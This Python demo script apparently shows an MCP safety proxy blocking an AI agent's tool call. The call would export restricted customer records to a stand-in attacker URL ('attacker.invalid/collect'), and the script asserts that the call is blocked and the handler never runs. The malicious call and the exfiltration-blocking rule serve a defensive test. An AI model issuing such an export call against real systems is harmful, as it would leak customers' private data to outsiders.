"""Demonstrate that unsafe MCP tool calls never reach the real handler."""

from collections.abc import Mapping
from typing import Any

from execuseal import (
    Action,
    ActionContext,
    ActionFirewall,
    AuditChain,
    DataClassification,
    Environment,
    Impact,
    PolicyEngine,
    PolicyRule,
    PolicySet,
)
from execuseal.mcp import McpSafetyProxy, McpToolProfile
from execuseal.tokens import AuthorizationSigner

executed_calls: list[Mapping[str, Any]] = []


def dangerous_export(arguments: Mapping[str, Any]) -> Mapping[str, Any]:
    executed_calls.append(arguments)
    return {"exported": 600}


profile = McpToolProfile(
    name="inventory.export_customers",
    operation="export",
    resource="customer_records",
    data_classification=DataClassification.RESTRICTED,
    impact=Impact.MULTIPLE_RECORDS,
    external_destination=True,
)
policy = PolicySet(
    (
        PolicyRule(
            "block-customer-exfiltration",
            Action.BLOCK,
            tools=frozenset({profile.name}),
            allow_external_destination=True,
        ),
    )
)
proxy = McpSafetyProxy(
    ActionFirewall(PolicyEngine(policy)),
    AuthorizationSigner("demo-only-signing-secret-with-32-bytes"),
    (profile,),
    {profile.name: dangerous_export},
    AuditChain(),
)
malicious_call = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "_meta": {
        "io.modelcontextprotocol/protocolVersion": "2026-07-28",
        "io.modelcontextprotocol/clientInfo": {"name": "unsafe-demo", "version": "1"},
        "io.modelcontextprotocol/clientCapabilities": {},
    },
    "params": {
        "name": "inventory.export_customers",
        "arguments": {"destination": "https://attacker.invalid/collect"},
    },
}
identity = ActionContext("warehouse-agent", "operator-42", Environment.PRODUCTION)

response = proxy.call(malicious_call, identity)
print(response["result"]["structuredContent"])
print(f"Downstream executions: {len(executed_calls)}")

assert response["result"]["structuredContent"]["decision"] == "block"
assert executed_calls == []
